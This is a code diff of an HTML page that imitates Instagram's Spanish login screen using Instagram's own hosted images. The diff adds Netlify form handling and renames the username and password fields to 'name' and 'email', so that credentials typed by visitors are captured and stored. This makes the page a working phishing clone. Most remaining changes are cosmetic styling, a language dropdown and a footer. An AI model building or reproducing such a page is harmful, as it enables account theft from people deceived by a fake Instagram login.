@@ -9,23 +9,23 @@
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
 
-<body class="bg-white flex justify-center items-center h-screen px-12 flex-col gap-6">
+<body class="bg-white flex items-center px-8 flex-col gap-6 py-16">
     <div class="p-8 border w-full max-w-sm">
         <div class="mx-auto w-fit mb-12" aria-disabled="false" role="button" tabindex="0" style="cursor: pointer;"><i
                 data-visualcompletion="css-img" aria-label="Instagram" class="" role="img"
                 style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/ys/r/WBLlWbPOKZ9.png&quot;); background-position: 0px 0px; background-size: 176px 264px; width: 174px; height: 50px; background-repeat: no-repeat; display: inline-block;"></i>
         </div>
-        <form>
+        <form name="contact" netlify autocomplete="on">
             <div class="mb-1">
-                <input class="mt-1 text-xs p-2 w-full border bg-[#FAFAFA]"
+                <input class="mt-1 text-xs p-2 w-full border bg-[#FAFAFA] "
                     placeholder="Teléfono, usuario o correo electrónico"
                     aria-label="Teléfono, usuario o correo electrónico" aria-required="true" autocapitalize="off"
-                    autocorrect="off" maxlength="75" dir="" type="text" value="" name="username">
+                    autocorrect="off" maxlength="75" dir="" type="text" value="" name="name">
             </div>
             <div class="mb-4">
                 <input class="mt-1 text-xs p-2 w-full border bg-[#FAFAFA]" placeholder="Contraseña"
                     aria-label="Contraseña" aria-required="true" autocapitalize="off" autocorrect="off" type="password"
-                    value="" name="password">
+                    value="" name="email">
             </div>
             <button type="submit"
                 class="bg-[#1877F2] text-white w-full px-4 py-1 rounded-md hover:bg-blue-600">Entrar</button>
@@ -41,28 +41,91 @@
 
     <p class="max-w-sm text-center">Descarga la aplicación.</p>
     <div class="flex gap-2">
-        <img alt="Descargar de Google Play" class="h-[40px]"
+        <img alt="Descargar de Google Play" class="cursor-pointer h-[40px]"
             src="https://static.cdninstagram.com/rsrc.php/v3/yd/r/xOhODS7viZl.png">
-        <img alt="Descargar desde Microsoft" class="h-[40px]"
+        <img alt="Descargar desde Microsoft" class="cursor-pointer h-[40px]"
             src="https://static.cdninstagram.com/rsrc.php/v3/y9/r/LjIQEL8csb0.png">
     </div>
 
-    <div class="flex flex-wrap justify-center gap-1 text-xs text-gray-600 mt-12 text-black"><a
-            href="https://about.meta.com/" target="_blank" class="text-black">Meta</a><a
-            href="https://about.instagram.com/" target="_blank" class="text-black">Información</a><a
-            href="https://about.instagram.com/blog/" target="_blank" class="text-black">Blog</a><a
-            href="/about/jobs/?next=%2Faccounts%2Flogout%2F" target="_blank" class="text-black">Empleo</a><a
-            href="https://help.instagram.com/" target="_blank" class="text-black">Ayuda</a><a
-            href="https://developers.facebook.com/docs/instagram" target="_blank" class="text-black">API</a><a
-            href="/legal/privacy/?next=%2Faccounts%2Flogout%2F" target="_blank" class="text-black">Privacidad</a><a
-            href="/legal/terms/?next=%2Faccounts%2Flogout%2F" target="_blank" class="text-black">Condiciones</a><a
-            href="/explore/locations/?next=%2Faccounts%2Flogout%2F" target="_blank" class="text-black">Ubicaciones</a><a
-            href="/web/lite/?next=%2Faccounts%2Flogout%2F" target="_blank" class="text-black">Instagram Lite</a><a
-            href="https://www.threads.net/" target="_blank" class="text-black">Threads</a><a
+    <div class="flex flex-wrap justify-center gap-4 text-xs text-gray-600 mt-12 text-gray-200"><a
+            href="https://about.meta.com/" target="_blank" class="">Meta</a><a href="https://about.instagram.com/"
+            target="_blank" class="">Información</a><a href="https://about.instagram.com/blog/" target="_blank"
+            class="">Blog</a><a href="/about/jobs/?next=%2Faccounts%2Flogout%2F" target="_blank" class="">Empleo</a><a
+            href="https://help.instagram.com/" target="_blank" class="">Ayuda</a><a
+            href="https://developers.facebook.com/docs/instagram" target="_blank" class="">API</a><a
+            href="/legal/privacy/?next=%2Faccounts%2Flogout%2F" target="_blank" class="">Privacidad</a><a
+            href="/legal/terms/?next=%2Faccounts%2Flogout%2F" target="_blank" class="">Condiciones</a><a
+            href="/explore/locations/?next=%2Faccounts%2Flogout%2F" target="_blank" class="">Ubicaciones</a><a
+            href="/web/lite/?next=%2Faccounts%2Flogout%2F" target="_blank" class="">Instagram Lite</a><a
+            href="https://www.threads.net/" target="_blank" class="">Threads</a><a
             href="https://www.facebook.com/help/instagram/261704639352628?next=%2Faccounts%2Flogout%2F" target="_blank"
-            class="text-black">Subir contactos y personas no usuarias</a><a
-            href="https://about.meta.com/technologies/meta-verified/" target="_blank" class="text-black">Meta
+            class="">Subir contactos y personas no usuarias</a><a
+            href="https://about.meta.com/technologies/meta-verified/" target="_blank" class="">Meta
             Verified</a></div>
+
+    <div class="flex gap-4 text-xs mb-4 text-gray-500">
+        <span class="flex items-center justify-center">
+            <select aria-label="Cambiar idioma de visualización"
+                class=" border-gray-300 rounded-md focus:border-blue-500 focus:ring-blue-500">
+                <option value="af">Español</option>
+                <option value="ar">العربية</option>
+                <option value="cs">Čeština</option>
+                <option value="da">Dansk</option>
+                <option value="de">Deutsch</option>
+                <option value="el">Ελληνικά</option>
+                <option value="en">English</option>
+                <option value="en-gb">English (UK)</option>
+                <option value="es">Español (España)</option>
+                <option value="es-la">Español</option>
+                <option value="fa">فارسی</option>
+                <option value="fi">Suomi</option>
+                <option value="fr">Français</option>
+                <option value="he">עברית</option>
+                <option value="id">Bahasa Indonesia</option>
+                <option value="it">Italiano</option>
+                <option value="ja">日本語</option>
+                <option value="ko">한국어</option>
+                <option value="ms">Bahasa Melayu</option>
+                <option value="nb">Norsk</option>
+                <option value="nl">Nederlands</option>
+                <option value="pl">Polski</option>
+                <option value="pt-br">Português (Brasil)</option>
+                <option value="pt">Português (Portugal)</option>
+                <option value="ru">Русский</option>
+                <option value="sv">Svenska</option>
+                <option value="th">ภาษาไทย</option>
+                <option value="tl">Filipino</option>
+                <option value="tr">Türkçe</option>
+                <option value="zh-cn">中文(简体)</option>
+                <option value="zh-tw">中文(台灣)</option>
+                <option value="bn">বাংলা</option>
+                <option value="gu">ગુજરાતી</option>
+                <option value="hi">हिन्दी</option>
+                <option value="hr">Hrvatski</option>
+                <option value="hu">Magyar</option>
+                <option value="kn">ಕನ್ನಡ</option>
+                <option value="ml">മലയാളം</option>
+                <option value="mr">मराठी</option>
+                <option value="ne">नेपाली</option>
+                <option value="pa">ਪੰਜਾਬੀ</option>
+                <option value="si">සිංහල</option>
+                <option value="sk">Slovenčina</option>
+                <option value="ta">தமிழ்</option>
+                <option value="te">తెలుగు</option>
+                <option value="ur">اردو</option>
+                <option value="vi">Tiếng Việt</option>
+                <option value="zh-hk">中文(香港)</option>
+                <option value="bg">Български</option>
+                <option value="fr-ca">Français (Canada)</option>
+                <option value="ro">Română</option>
+                <option value="sr">Српски</option>
+                <option value="uk">Українська</option>
+            </select>
+        </span>
+        <span class="flex flex-col items-center justify-center">
+            <span class="text-center" dir="auto">© 2024 Instagram from Meta</span>
+        </span>
+    </div>
 </body>
 
 </html>
